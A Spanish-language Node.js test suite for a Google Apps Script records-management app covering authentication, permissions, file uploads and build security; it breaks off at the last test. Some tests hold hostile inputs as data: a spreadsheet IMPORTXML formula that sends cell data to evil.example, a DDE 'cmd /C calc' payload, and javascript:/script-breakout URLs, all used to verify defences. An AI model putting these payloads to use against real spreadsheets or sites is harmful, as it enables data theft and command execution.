// Pruebas del servidor de Apps Script contra el simulador.
// Correr:  node --test pruebas/
const { test } = require("node:test");
const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const path = require("node:path");
const fs = require("node:fs");
const { crearEntorno } = require("./simulador.cjs");

// base/base.json son los datos reales migrados: NO se suben a GitHub (.gitignore).
// Sin ese archivo, las pruebas que dependen de esos datos se saltan.
const RUTA_BASE = path.join(__dirname, "..", "base", "base.json");
const HAY_BASE = fs.existsSync(RUTA_BASE);
const BASE = HAY_BASE ? JSON.parse(fs.readFileSync(RUTA_BASE, "utf8")) : null;
const testBase = HAY_BASE ? test : (n, f) => test(n, { skip: "sin base/base.json (los datos reales no se suben a GitHub)" }, f);
const PDF = Buffer.from("%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n").toString("base64");
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]).toString("base64");

/** Entorno instalado con la base migrada y el admin con contraseña definitiva. */
function preparar({ conBase = true } = {}) {
  const e = crearEntorno();
  if (conBase) e.cargarBase(BASE);
  const salida = e.comoDueno("instalar");
  const m = salida.match(/Usuario: (\S+)\s+Contraseña temporal: (\S+)/);
  assert.ok(m, "instalar() debe mostrar el primer administrador:\n" + salida);
  e.comoAnonimo(); // a partir de aquí, como la app web pública
  const r1 = e.api(null, "entrar", { usuario: m[1], clave: m[2] });
  assert.equal(r1.ok, true, JSON.stringify(r1));
  assert.equal(r1.datos.debe_cambiar, true);
  const r2 = e.api(r1.datos.token, "cambiarClave", { actual: m[2], nueva: "Gestion2026" });
  assert.equal(r2.ok, true, JSON.stringify(r2));
  e.admin = r2.datos.token;
  e.salidaInstalar = salida;
  return e;
}

function alta(e, usuario, rol, tipos) {
  const r = e.api(e.admin, "guardarUsuario", { nuevo: true, usuario, nombre: "Persona " + usuario, rol, tipos });
  assert.equal(r.ok, true, JSON.stringify(r));
  const r1 = e.api(null, "entrar", { usuario, clave: r.datos.temporal });
  const r2 = e.api(r1.datos.token, "cambiarClave", { actual: r.datos.temporal, nueva: "Minutario2026x" });
  assert.equal(r2.ok, true, JSON.stringify(r2));
  return r2.datos.token;
}

const nuevoOficio = (extra = {}) => ({ tipo: "OFS", asunto: "Solicitud de apoyo logístico", fecha: "2026-10-21",
  dirigido_id: "P0030", dirigido_a: "Mtro. Daniel Esteban Ramírez Garcén\nDirector General", firma_id: "P0063",
  firma: "Lic. José Antonio Jiménez Islas\nSubsecretario", elaboro: "Valentina J", acuse: "NO", ...extra });

test("solo estas funciones se pueden llamar desde el navegador", () => {
  const e = crearEntorno();
  const publicas = e.funcionesDeclaradas.filter((f) => !f.endsWith("_")).sort();
  assert.deepEqual(publicas, ["api", "doGet", "doPost", "instalar", "respaldoSemanal", "restablecerAdministrador", "revisarSeguridad"]);
  assert.throws(() => e.run("tabla_", "Usuarios"), /no es una función pública/);
  assert.throws(() => e.run("hashClave_", "x"), /no es una función pública/);
});

test("doGet arma la página completa con estilos, Excel y app (aunque Google quite los comentarios)", () => {
  const e = crearEntorno();
  const html = e.run("doGet").html;
  assert.match(html, /^<!DOCTYPE html><html lang="es"><head>/);
  assert.match(html, /<style>[\s\S]*--morado: #8f4889[\s\S]*<\/style>\s*<\/head><body>/, "estilos dentro del head");
  assert.match(html, /<div id="app" class="app">/);
  assert.match(html, /<script>[\s\S]*var ExcelCG = [\s\S]*<\/script>/);
  assert.match(html, /<script>[\s\S]*function llamar\(accion, datos\)[\s\S]*<\/script>\s*<\/body><\/html>$/);
  assert.equal((html.match(/<script>/g) || []).length, 2, "solo los dos bloques de código");
});

testBase("API para Vercel (doPost): mismas reglas que google.script.run", () => {
  const e = preparar();
  const est = e.post({ accion: "estado" });
  assert.equal(est.mime, "application/json");
  assert.equal(est.json.ok, true);
  assert.equal(e.post({ token: "x".repeat(64), accion: "listar", datos: { tipo: "OFS", anio: 2026 } }).json.codigo, "SESION");
  const ok = e.post({ token: e.admin, accion: "listar", datos: { tipo: "OFS", anio: 2026 } }).json;
  assert.equal(ok.ok, true);
  assert.equal(ok.datos.length, 416);
  assert.equal(e.post("esto no es json").json.codigo, "PETICION");
  assert.equal(e.post("").json.codigo, "PETICION");
  const cap = alta(e, "beto", "consulta", ["OFE"]);
  assert.equal(e.post({ token: cap, accion: "usuarios" }).json.codigo, "PERMISO");
  assert.equal(e.post({ token: cap, accion: "listar", datos: { tipo: "OFS", anio: 2026 } }).json.codigo, "PERMISO");
});

testBase("con dirección pública configurada, la URL de Google solo muestra un enlace", () => {
  const e = preparar();
  assert.equal(e.api(e.admin, "guardarConfig", { url_web: "javascript:alert(1)" }).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardarConfig", { url_web: 'https://x.vercel.app/"><script>' }).codigo, "DATOS");
  e.api(e.admin, "guardarConfig", { url_web: "https://control-gestion.vercel.app" });
  const html = e.run("doGet").html;
  assert.match(html, /href="https:\/\/control-gestion\.vercel\.app"/);
  assert.doesNotMatch(html, /function llamar/);
  assert.equal(e.api(e.admin, "inicio").datos.config.url_web, "https://control-gestion.vercel.app");
});

testBase("instalar: crea pestañas, carpetas privadas, respaldo y admin; es repetible", () => {
  const e = preparar();
  for (const h of ["Registros", "Directorio", "Usuarios", "Bitacora", "Config"]) assert.ok(e.hoja(h), h);
  assert.equal(e.disparadores.length, 1);
  assert.match(e.salidaInstalar, /La hoja de la base: privada/);
  assert.match(e.salidaInstalar, /Todo en orden/);
  const otra = e.comoDueno("instalar");
  assert.equal(e.disparadores.length, 1, "no duplica el disparador");
  assert.match(otra, /Administradores activos: admin/);
  assert.doesNotMatch(otra, /Contraseña temporal/);
  assert.equal(e.hoja("Registros").getLastRow(), 733, "no tocó los registros migrados");
});

testBase("las funciones del dueño no se pueden usar desde la app web", () => {
  const e = preparar();
  for (const fn of ["instalar", "restablecerAdministrador", "revisarSeguridad"]) {
    assert.throws(() => e.run(fn), /Solo lo puede correr el dueño|solo lo puede correr el dueño/i, fn);
  }
  // respaldoSemanal es pública pero inofensiva: una copia por semana
  assert.match(e.run("respaldoSemanal"), /Respaldo Control de Gestión/);
  assert.match(e.run("respaldoSemanal"), /Ya hay respaldo/);
});

test("contraseñas: PBKDF2 estándar (igual que el de Node)", () => {
  const e = crearEntorno();
  const h = e.ctx.hashClave_("Gestion2026", Buffer.from("0123456789abcdef").toString("base64"), 1000);
  const esperado = crypto.pbkdf2Sync("Gestion2026", Buffer.from("0123456789abcdef"), 1000, 32, "sha256").toString("base64");
  assert.equal(h.split("$")[3], esperado);
  assert.equal(e.ctx.verificarClave_("Gestion2026", h), true);
  assert.equal(e.ctx.verificarClave_("gestion2026", h), false);
  assert.notEqual(e.ctx.hashClave_("igual1234").split("$")[2], e.ctx.hashClave_("igual1234").split("$")[2], "sal distinta cada vez");
});

testBase("entrar: mismo mensaje con usuario inexistente; bloqueo tras 5 fallas", () => {
  const e = preparar();
  const a = e.api(null, "entrar", { usuario: "nadie", clave: "x" });
  const b = e.api(null, "entrar", { usuario: "admin", clave: "mala" });
  assert.equal(a.error, b.error);
  for (let i = 0; i < 4; i++) e.api(null, "entrar", { usuario: "admin", clave: "mala" });
  const c = e.api(null, "entrar", { usuario: "admin", clave: "Gestion2026" });
  assert.equal(c.codigo, "BLOQUEADO", "con la buena ya no entra mientras está bloqueado");
  e.reloj.offset += 16 * 60 * 1000;
  assert.equal(e.api(null, "entrar", { usuario: "admin", clave: "Gestion2026" }).ok, true, "a los 15 min se desbloquea");
  const usuarios = e.hoja("Usuarios").datos.map((f) => f.join("|")).join("\n");
  assert.doesNotMatch(usuarios, /Gestion2026/, "la contraseña nunca queda en claro");
});

testBase("sesión: token falso, contraseña temporal, desactivación y cambio de permisos", () => {
  const e = preparar();
  assert.equal(e.api("a".repeat(64), "inicio").codigo, "SESION");
  assert.equal(e.api("'; drop", "inicio").codigo, "SESION");
  const r = e.api(e.admin, "guardarUsuario", { nuevo: true, usuario: "ana.perez", nombre: "Ana Pérez", rol: "captura", tipos: ["OFE"] });
  const t = e.api(null, "entrar", { usuario: "ana.perez", clave: r.datos.temporal }).datos.token;
  assert.equal(e.api(t, "inicio").codigo, "CAMBIAR_CLAVE", "con temporal no puede hacer nada más");
  assert.equal(e.api(t, "cambiarClave", { actual: r.datos.temporal, nueva: "corta" }).codigo, "DATOS");
  assert.equal(e.api(t, "cambiarClave", { actual: r.datos.temporal, nueva: "ana.perez123" }).codigo, "DATOS", "no puede contener el usuario");
  const t2 = e.api(t, "cambiarClave", { actual: r.datos.temporal, nueva: "Oficios2026" }).datos.token;
  assert.equal(e.api(t, "inicio").codigo, "SESION", "la sesión vieja muere al cambiar contraseña");
  assert.equal(e.api(t2, "inicio").ok, true);
  e.api(e.admin, "guardarUsuario", { usuario: "ana.perez", nombre: "Ana Pérez", rol: "captura", tipos: ["OFE", "OFS"] });
  assert.equal(e.api(t2, "inicio").codigo, "SESION", "cambio de permisos = volver a entrar");
  const t3 = e.api(null, "entrar", { usuario: "ana.perez", clave: "Oficios2026" }).datos.token;
  e.api(e.admin, "guardarUsuario", { usuario: "ana.perez", nombre: "Ana Pérez", rol: "captura", tipos: ["OFE"], activo: "NO" });
  assert.equal(e.api(t3, "inicio").codigo, "SESION");
  assert.equal(e.api(null, "entrar", { usuario: "ana.perez", clave: "Oficios2026" }).codigo, "INACTIVO");
  e.reloj.offset += 4 * 3600 * 1000;
  assert.equal(e.api(e.admin, "inicio").codigo, "SESION", "3 h sin actividad cierran la sesión");
});

testBase("permisos por rol y por libreta", () => {
  const e = preparar();
  const cap = alta(e, "beto", "captura", ["OFE"]);
  const con = alta(e, "carla", "consulta", ["OFS", "OFE"]);
  const ini = e.api(cap, "inicio").datos;
  assert.deepEqual(ini.orden, ["OFE"]);
  assert.equal(ini.conteos.OFE, 146);
  assert.equal(e.api(cap, "listar", { tipo: "OFS", anio: 2026 }).codigo, "PERMISO");
  assert.equal(e.api(cap, "obtener", { id: "m-ofs-2026-001" }).codigo, "PERMISO");
  assert.equal(e.api(cap, "guardar", nuevoOficio()).codigo, "PERMISO");
  assert.equal(e.api(cap, "descargarArchivo", { id: "m-ofs-2026-001", clase: "oficio" }).codigo, "PERMISO");
  assert.equal(e.api(con, "guardar", { ...nuevoOficio(), tipo: "OFE" }).codigo, "PERMISO", "consulta no captura");
  assert.equal(e.api(con, "listar", { tipo: "OFS", anio: 2026 }).datos.length, 416);
  for (const [acc, d] of [["usuarios"], ["bitacora"], ["guardarConfig", {}], ["cancelar", { id: "m-ofs-2026-001", motivo: "prueba de permisos" }], ["unirPersonas", { de: "P0001", a: "P0002" }], ["restablecerClave", { usuario: "admin" }]]) {
    assert.equal(e.api(cap, acc, d).codigo, "PERMISO", acc);
    assert.equal(e.api(con, acc, d).codigo, "PERMISO", acc);
  }
  assert.equal(e.api(cap, "noExiste").codigo, "PETICION");
  assert.equal(e.api(cap, "__proto__").codigo, "PETICION");
  assert.equal(e.api(cap, "constructor").codigo, "PETICION");
  assert.equal(e.api(cap, "guardar", { ...nuevoOficio(), tipo: "OFE", estatus: "Cancelado" }).codigo, "PERMISO", "captura no da de alta ya cancelado");
  const r = e.api(cap, "guardar", { ...nuevoOficio(), tipo: "OFE", estatus: "Pendiente" });
  assert.equal(r.ok, true);
  const ed = e.api(cap, "guardar", { ...nuevoOficio(), tipo: "OFE", id: r.datos.registro.id, version: r.datos.registro.version, estatus: "En trámite" });
  assert.equal(ed.ok, true);
  const ca = e.api(cap, "guardar", { ...nuevoOficio(), tipo: "OFE", id: r.datos.registro.id, version: ed.datos.registro.version, estatus: "Cancelado" });
  assert.equal(ca.codigo, "PERMISO", "captura no puede cancelar editando el estatus");
});

testBase("consecutivo y número oficial automáticos, sin huecos", () => {
  const e = preparar();
  const a = e.api(e.admin, "guardar", nuevoOficio()).datos.registro;
  const b = e.api(e.admin, "guardar", nuevoOficio({ asunto: "Otro" })).datos.registro;
  assert.equal(a.consecutivo, 416, "después del 415 (y el 370 BIS) sigue el 416");
  assert.equal(a.numero, "SAPCI/STPI/416/2026");
  assert.equal(b.consecutivo, 417);
  assert.equal(b.numero, "SAPCI/STPI/417/2026");
  const c = e.api(e.admin, "guardar", { ...nuevoOficio(), tipo: "CIR", numero: "SAPCI/DGAF/PRUEBA/001/2026" }).datos.registro;
  assert.equal(c.consecutivo, 78);
  assert.equal(e.candado.tomado, false);
  // intentar colar el número o el consecutivo no sirve
  const d = e.api(e.admin, "guardar", nuevoOficio({ numero: "INVENTADO", consecutivo: 1, anio: 1999, id: undefined })).datos.registro;
  assert.equal(d.numero, "SAPCI/STPI/418/2026");
  assert.equal(d.anio, 2026);
});

testBase("edición con control de versión, bitácora con el antes y después", () => {
  const e = preparar();
  const r = e.api(e.admin, "obtener", { id: "m-ofe-2026-002" }).datos.registro;
  const ok = e.api(e.admin, "guardar", { ...r, estatus: "En trámite", fecha_limite: "2026-11-05" });
  assert.equal(ok.ok, true, JSON.stringify(ok));
  assert.equal(ok.datos.registro.version, 2);
  const viejo = e.api(e.admin, "guardar", { ...r, asunto: "cambio sobre versión vieja" });
  assert.equal(viejo.codigo, "CAMBIO");
  const det = e.api(e.admin, "obtener", { id: "m-ofe-2026-002" }).datos;
  assert.match(det.historial[0].detalle, /estatus: «» → «En trámite»/);
  assert.equal(det.ligados[0].id, "m-ofs-2026-001", "el entrante quedó ligado al oficio que respondía");
  assert.equal(det.registro.archivo_id, undefined, "no se mandan IDs de Drive al navegador");
});

testBase("validación: fechas, largos, estatus, campos que no son de la libreta", () => {
  const e = preparar();
  assert.equal(e.api(e.admin, "guardar", nuevoOficio({ fecha: "2026-02-30" })).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardar", nuevoOficio({ fecha: "" })).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardar", nuevoOficio({ asunto: "   " })).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardar", nuevoOficio({ asunto: "x".repeat(3001) })).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardar", nuevoOficio({ estatus: "Inventado" })).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardar", { ...nuevoOficio(), tipo: "XXX" }).codigo, "DATOS");
  const c = e.api(e.admin, "guardar", { ...nuevoOficio(), tipo: "CIR", numero: "C-1", fecha_recepcion: "2026-10-10", elaboro: "X", dirigido_id: "NOEXISTE" }).datos.registro;
  assert.equal(c.fecha_recepcion, "", "Circulares no tiene fecha de recepción");
  assert.equal(c.elaboro, "");
  assert.equal(c.dirigido_id, "", "un ID de directorio inventado se descarta");
});

testBase("texto que parece fórmula se guarda como texto (no se ejecuta en la hoja)", () => {
  const e = preparar();
  const malo = '=IMPORTXML("https://evil.example/?d="&A1,"//a")';
  const r = e.api(e.admin, "guardar", nuevoOficio({ asunto: malo, observaciones: "+cmd|' /C calc'!A0", elaboro: "@SUM(1)" })).datos.registro;
  const hoja = e.hoja("Registros");
  const fila = hoja.datos[hoja.getLastRow() - 1];
  assert.ok(!fila.some((v) => v && v.formula), "ninguna celda quedó como fórmula");
  const leido = e.api(e.admin, "obtener", { id: r.id }).datos.registro;
  assert.equal(leido.asunto, malo);
  assert.equal(leido.observaciones, "+cmd|' /C calc'!A0");
  assert.equal(leido.elaboro, "@SUM(1)");
});

testBase("números de folio repetidos piden confirmación", () => {
  const e = preparar();
  const d = { ...nuevoOficio(), tipo: "OFE", numero: "SAPCI/STPI/DEAP/002/2026" };
  const r = e.api(e.admin, "guardar", d);
  assert.equal(r.codigo, "DUPLICADO");
  assert.equal(r.extra.id, "m-ofe-2026-001");
  assert.equal(e.api(e.admin, "guardar", { ...d, numero: "sapci/stpi/deap/002/2026 " }).codigo, "DUPLICADO", "ignora mayúsculas y espacios");
  assert.equal(e.api(e.admin, "guardar", { ...d, confirmarDuplicado: true }).ok, true);
});

testBase("responder un entrante lo deja como Atendido", () => {
  const e = preparar();
  const ent = e.api(e.admin, "guardar", { ...nuevoOficio(), tipo: "OFE", numero: "SAPCI/DEAJT/0999/2026", estatus: "Pendiente" }).datos.registro;
  const resp = e.api(e.admin, "guardar", nuevoOficio({ relacionado_id: ent.id, marcarAtendido: true, asunto: "Respuesta" })).datos.registro;
  const det = e.api(e.admin, "obtener", { id: ent.id }).datos;
  assert.equal(det.registro.estatus, "Atendido");
  assert.equal(det.ligados[0].id, resp.id);
  assert.match(det.historial[0].detalle, /Atendido/);
});

testBase("un registro cancelado solo lo toca un administrador (aunque se llame al servidor directo)", () => {
  const e = preparar();
  const cap = alta(e, "beto", "captura", ["OFS", "OFE"]);
  const r = e.api(cap, "guardar", nuevoOficio()).datos.registro;
  e.api(cap, "subirArchivo", { id: r.id, clase: "oficio", nombre: "a.pdf", mime: "application/pdf", base64: PDF });
  const v = e.api(cap, "obtener", { id: r.id }).datos.registro.version;
  const c = e.api(e.admin, "cancelar", { id: r.id, version: v, motivo: "Se capturó por error" }).datos.registro;
  assert.equal(e.api(cap, "guardar", { ...nuevoOficio(), id: r.id, version: c.version, estatus: "Pendiente" }).codigo, "PERMISO", "no se puede descancelar");
  assert.equal(e.api(cap, "quitarArchivo", { id: r.id, clase: "oficio" }).codigo, "PERMISO");
  assert.equal(e.api(cap, "subirArchivo", { id: r.id, clase: "acuse", nombre: "a.pdf", mime: "application/pdf", base64: PDF }).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardar", { ...nuevoOficio(), id: r.id, version: c.version, estatus: "Pendiente" }).ok, true, "el admin sí puede");
});

testBase("al editar se valida con la libreta del registro; relación solo con registros que existen", () => {
  const e = preparar();
  const r = e.api(e.admin, "guardar", { ...nuevoOficio(), tipo: "CIR", numero: "C-PRUEBA/1", relacionado_id: "no-existe" }).datos.registro;
  assert.equal(r.relacionado_id, "");
  const ed = e.api(e.admin, "guardar", { ...nuevoOficio(), tipo: "OFE", id: r.id, version: r.version, numero: "C-PRUEBA/1", fecha_recepcion: "2026-10-01", elaboro: "colado", relacionado_id: r.id }).datos.registro;
  assert.equal(ed.tipo, "CIR");
  assert.equal(ed.fecha_recepcion, "", "Circulares no tiene fecha de recepción aunque el navegador diga OFE");
  assert.equal(ed.elaboro, "");
  assert.equal(ed.relacionado_id, "", "no se liga consigo mismo");
});

testBase("cancelar: solo admin, con motivo; el número no se reutiliza", () => {
  const e = preparar();
  const r = e.api(e.admin, "guardar", nuevoOficio()).datos.registro;
  assert.equal(e.api(e.admin, "cancelar", { id: r.id, version: r.version, motivo: "" }).codigo, "DATOS");
  const c = e.api(e.admin, "cancelar", { id: r.id, version: r.version, motivo: "Se capturó por error" });
  assert.equal(c.datos.registro.estatus, "Cancelado");
  const n = e.api(e.admin, "guardar", nuevoOficio()).datos.registro;
  assert.equal(n.consecutivo, r.consecutivo + 1);
});

testBase("archivos: tipo real, tamaño, permisos, descarga idéntica, acuse marca SI", () => {
  const e = preparar();
  const cap = alta(e, "beto", "captura", ["OFE"]);
  const r = e.api(cap, "guardar", { ...nuevoOficio(), tipo: "OFE", numero: "X/1/2026" }).datos.registro;
  assert.equal(e.api(cap, "subirArchivo", { id: r.id, clase: "oficio", nombre: "a.pdf", mime: "application/pdf", base64: PNG }).codigo, "DATOS", "un PNG disfrazado de PDF no pasa");
  assert.equal(e.api(cap, "subirArchivo", { id: r.id, clase: "oficio", nombre: "a.exe", mime: "application/x-msdownload", base64: PDF }).codigo, "DATOS");
  const grande = Buffer.alloc(11 * 1024 * 1024, 1); grande.write("%PDF");
  assert.equal(e.api(cap, "subirArchivo", { id: r.id, clase: "oficio", nombre: "g.pdf", mime: "application/pdf", base64: grande.toString("base64") }).codigo, "DATOS");
  const s = e.api(cap, "subirArchivo", { id: r.id, clase: "oficio", nombre: "oficio escaneado.pdf", mime: "application/pdf", base64: PDF });
  assert.equal(s.ok, true, JSON.stringify(s));
  assert.equal(s.datos.registro.tiene_archivo, true);
  const ac = e.api(cap, "subirArchivo", { id: r.id, clase: "acuse", nombre: "acuse.png", mime: "image/png", base64: PNG }).datos.registro;
  assert.equal(ac.acuse, "SI");
  const d = e.api(cap, "descargarArchivo", { id: r.id, clase: "oficio" }).datos;
  assert.equal(d.base64, PDF);
  assert.equal(d.nombre, "oficio escaneado.pdf");
  const archivos = [...e.drive.archivos.values()].filter((a) => a.mime === "application/pdf");
  assert.ok(archivos.every((a) => a.acceso === "PRIVATE"));
  // reemplazar manda el anterior a la papelera
  e.api(cap, "subirArchivo", { id: r.id, clase: "oficio", nombre: "v2.pdf", mime: "application/pdf", base64: PDF });
  assert.equal([...e.drive.archivos.values()].filter((a) => a.mime === "application/pdf" && !a.papelera).length, 1);
  const q = e.api(cap, "quitarArchivo", { id: r.id, clase: "oficio" }).datos.registro;
  assert.equal(q.tiene_archivo, false);
  const otro = alta(e, "dora", "consulta", ["OFS"]);
  assert.equal(e.api(otro, "descargarArchivo", { id: r.id, clase: "acuse" }).codigo, "PERMISO");
  const bit = e.api(e.admin, "bitacora", { accion: "descarga" }).datos.filas;
  assert.equal(bit[0].usuario, "beto");
});

testBase("directorio: aviso de parecidos y unir duplicados", () => {
  const e = preparar();
  const cap = alta(e, "beto", "captura", ["OFS", "OFE"]);
  const p = e.api(cap, "guardarPersona", { nombre: "Mtra. Rebeca Ortega Yáñez", cargo: "Subdirectora" });
  assert.equal(p.codigo, "PARECIDO");
  assert.ok(p.extra.parecidos.some((x) => /Rebaca|Rebeca/.test(x.nombre)));
  const n = e.api(cap, "guardarPersona", { nombre: "Lic. Persona Totalmente Nueva", cargo: "Enlace" });
  assert.equal(n.ok, true);
  assert.equal(n.datos.persona.id, "P0144");
  const antes = e.api(e.admin, "directorio").datos;
  const reb = antes.filter((x) => /Ortega Ya/.test(x.nombre));
  assert.equal(reb.length, 2);
  const u = e.api(e.admin, "unirPersonas", { de: reb[0].id, a: reb[1].id });
  assert.equal(u.ok, true);
  assert.ok(u.datos.actualizados >= 1);
  const despues = e.api(cap, "directorio").datos;
  assert.equal(despues.filter((x) => /Ortega Ya/.test(x.nombre)).length, 1, "captura ya no ve la ficha unida");
  // unir a José Antonio Jiménez (cientos de registros) en una sola escritura
  const jose = antes.find((x) => /Jiménez Islas/.test(x.nombre));
  const dummy = e.api(e.admin, "guardarPersona", { nombre: "Zz Duplicado Prueba", confirmar: true }).datos.persona;
  const lecturasAntes = e.hoja("Registros").lecturas;
  const u2 = e.api(e.admin, "unirPersonas", { de: jose.id, a: dummy.id });
  assert.ok(u2.datos.actualizados > 400);
  assert.ok(e.hoja("Registros").lecturas - lecturasAntes < 10, "no escribe fila por fila");
  const r = e.api(e.admin, "obtener", { id: "m-ofs-2026-001" }).datos.registro;
  assert.equal(r.firma_id, dummy.id);
  assert.match(r.firma, /^Zz Duplicado Prueba\n/);
});

testBase("usuarios: no se puede quedar sin administrador", () => {
  const e = preparar();
  assert.equal(e.api(e.admin, "guardarUsuario", { usuario: "admin", nombre: "Administrador", rol: "captura", tipos: "*" }).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardarUsuario", { usuario: "admin", nombre: "Administrador", rol: "admin", activo: "NO" }).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardarUsuario", { nuevo: true, usuario: "Con Espacio", nombre: "X Y", rol: "captura", tipos: "*" }).codigo, "DATOS");
  assert.equal(e.api(e.admin, "guardarUsuario", { nuevo: true, usuario: "admin", nombre: "Otro", rol: "captura", tipos: "*" }).codigo, "DATOS");
  const lista = e.api(e.admin, "usuarios").datos;
  assert.ok(lista.every((u) => !("clave" in u) && !("sello" in u)), "no salen contraseñas ni sellos");
});

testBase("restablecer contraseña y desbloquear", () => {
  const e = preparar();
  alta(e, "eva", "captura", "*");
  for (let i = 0; i < 5; i++) e.api(null, "entrar", { usuario: "eva", clave: "mala" });
  assert.equal(e.api(e.admin, "usuarios").datos.find((u) => u.usuario === "eva").bloqueado, true);
  const r = e.api(e.admin, "restablecerClave", { usuario: "eva" }).datos;
  const t = e.api(null, "entrar", { usuario: "eva", clave: r.temporal });
  assert.equal(t.ok, true);
  assert.equal(t.datos.debe_cambiar, true);
});

testBase("pendientes y exportación", () => {
  const e = preparar();
  const p = e.api(e.admin, "pendientes").datos;
  assert.ok(p.porAtender.length >= 14, "los números apartados quedaron como pendientes");
  assert.ok(p.sinAcuse.length > 300);
  const x = e.api(e.admin, "exportar", { tipo: "TODOS", anio: 2026 }).datos.filas;
  assert.equal(x.length, 732);
  assert.equal(e.api(e.admin, "exportar", { tipo: "OFS", anio: "abc" }).codigo, "DATOS");
});

testBase("configuración: plantilla del número oficial", () => {
  const e = preparar();
  assert.equal(e.api(e.admin, "guardarConfig", { plantilla_OFS: "SIN-NUMERO" }).codigo, "DATOS");
  e.api(e.admin, "guardarConfig", { plantilla_OFS: "SAPCI/STPI/{NNN}/{AAAA}-B" });
  assert.equal(e.api(e.admin, "guardar", nuevoOficio()).datos.registro.numero, "SAPCI/STPI/416/2026-B");
});

testBase("hoja manipulada a mano: se detecta y no se lee mal", () => {
  const e = preparar();
  const h = e.hoja("Registros");
  [h.datos[0][6], h.datos[0][7]] = [h.datos[0][7], h.datos[0][6]];
  const r = e.api(e.admin, "listar", { tipo: "OFS", anio: 2026 });
  assert.equal(r.codigo, "INSTALACION");
  assert.match(r.error, /No muevas columnas/);
});

testBase("errores inesperados no filtran detalles internos", () => {
  const e = preparar();
  e.ctx.SpreadsheetApp.openById = () => { throw new Error("detalle interno con ID secreto"); };
  const r = e.api(e.admin, "inicio");
  assert.equal(r.codigo, "INTERNO");
  assert.doesNotMatch(r.error, /secreto/);
  assert.ok(e.estado.errores.some((x) => /secreto/.test(x)), "sí queda en el registro de Apps Script");
});

test("sin base cargada: instalar en una hoja vacía funciona", () => {
  const e = preparar({ conBase: false });
  assert.equal(e.api(e.admin, "listar", { tipo: "OFS", anio: 2026 }).datos.length, 0);
  const r = e.api(e.admin, "guardar", nuevoOficio({ dirigido_id: "", firma_id: "" })).datos.registro;
  assert.equal(r.numero, "SAPCI/STPI/001/2026");
  // muchas filas: la hoja crece sola y lo nuevo sigue como texto
  const h = e.hoja("Registros");
  h.maxRows = h.getLastRow();
  const r2 = e.api(e.admin, "guardar", nuevoOficio({ dirigido_id: "", firma_id: "", carpeta: "007" })).datos.registro;
  assert.equal(e.api(e.admin, "obtener", { id: r2.id }).datos.registro.carpeta, "007", "no se pierde el cero a la izquierda");
});

test("armar-web: arma dist/ para Vercel sin código en línea y exige la URL del servidor", () => {
  const { execFileSync, spawnSync } = require("node:child_process");
  const raiz = path.join(__dirname, "..");
  const sin = spawnSync(process.execPath, ["herramientas/armar-web.mjs"], { cwd: raiz, env: { ...process.env, CG_API_URL: "" } });
  assert.equal(sin.status, 1, "sin CG_API_URL no arma nada");
  const mala = spawnSync(process.execPath, ["herramientas/armar-web.mjs"], { cwd: raiz, env: { ...process.env, CG_API_URL: "https://evil.example/exec" } });
  assert.equal(mala.status, 1, "solo acepta URLs de script.google.com");
  execFileSync(process.execPath, ["herramientas/armar-web.mjs"], { cwd: raiz, env: { ...process.env, CG_API_URL: "https://script.google.com/macros/s/AKfycbPRUEBA_1-2/exec" } });
  const html = fs.readFileSync(path.join(raiz, "dist", "index.html"), "utf8");
  assert.doesNotMatch(html, /<script>[^<]|<style>|<!--(ESTILOS|EXCEL|APP)-->|<base /);
  assert.match(html, /<script src="app\.js\?v=[0-9a-f]{10}"><\/script>/);
  assert.equal(fs.readFileSync(path.join(raiz, "dist", "config.js"), "utf8").includes('"https://script.google.com/macros/s/AKfycbPRUEBA_1-2/exec"'), true);
  const app = fs.readFileSync(path.join(raiz, "dist", "app.js"), "utf8");
  assert.doesNotMatch(app, /<\/?script>\s*$/);
  const csp = JSON.parse(fs.readFileSync(path.join(raiz, "vercel.json"), "utf8")).headers[0].headers.find((h) => h.key === "Content-Security-Policy").value;
  assert.match(csp, /script-src 'self';/);
  assert.match(csp, /connect-src https:\/\/script\.google\.com https:\/\/script\.googleusercontent\.com;/);
  assert.match(csp, /frame-ancestors 'none'/);
  assert.match(csp, /manifest-src 'self'/);
  const man = JSON.parse(fs.readFileSync(path.join(raiz, "dist", "manifest.webmanifest"), "utf8"));
  assert.equal(man.name, "Control de Gestión");
  assert.deepEqual(man.icons.map((i) => i.sizes), ["192x192", "512x512", "512x512"]);
  for (const i of man.icons) assert.ok(fs.existsSync(path.join(raiz, "dist", i.src)), i.src);
  assert.match(html, /<title>Control de Gestión<\/title>/);
  assert.match(html, /rel="apple-touch-icon" href="icono-180\.png/);
  assert.match(html, /rel="manifest" href="manifest\.webmanifest/);
});

testBase("indicadores del portal: por libreta y solo de las libretas propias", () => {
  const e = preparar();
  const ind = e.api(e.admin, "indicadores").datos;
  assert.equal(ind.porTipo.OFS.total, 416);
  assert.equal(ind.porTipo.VOL.total, 16);
  assert.ok(ind.porTipo.OFS.porAtender >= 14);
  assert.ok(ind.porTipo.OFS.sinAcuse > 300);
  assert.equal(ind.global.sinAcuse, e.api(e.admin, "pendientes").datos.sinAcuse.length, "el portal dice lo mismo que la pantalla de Pendientes");
  const r = e.api(e.admin, "guardar", { tipo: "OFE", asunto: "Vencido de prueba", fecha: "2026-10-01", estatus: "Pendiente", fecha_limite: "2026-10-02" }).datos.registro;
  assert.ok(r);
  assert.equal(e.api(e.admin, "indicadores").datos.porTipo.OFE.vencidos, ind.porTipo.OFE.vencidos + 1);
  const cap = alta(e, "beto", "captura", ["CIR"]);
  const suyo = e.api(cap, "indicadores").datos;
  assert.deepEqual(Object.keys(suyo.porTipo), ["CIR"], "no ve números de otras libretas");
  assert.equal(suyo.global.sinAcuse, 0);
  assert.ok(e.api(cap, "inicio").datos.indicadores.porTipo.CIR.total >= 77);
});

test("la versión de la página y la del servidor coinciden", () => {
